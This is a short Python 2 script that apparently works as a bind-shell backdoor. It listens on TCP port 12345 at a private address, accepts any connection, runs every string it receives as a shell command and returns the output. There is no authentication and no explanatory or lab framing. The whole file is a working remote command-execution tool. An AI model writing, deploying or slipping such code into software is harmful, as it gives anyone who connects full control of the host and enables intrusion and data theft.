#!/usr/bin/env python
# _*_ coding:utf-8 _*_
import socket
import commands
host = '192.168.59.128'
port = 12345
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((host,port))
s.listen(1)
while 1:
	conn,addr = s.accept()
	print 'Connected by',addr
	while 1:
		data = conn.recv(1024)
		cmd_status,cmd_result = commands.getstatusoutput(data)
		if len(cmd_result.strip()) == 0:
			conn.sendall('Done.')
		else:
			conn.sendall(cmd_result)
	conn.close()
s.close()
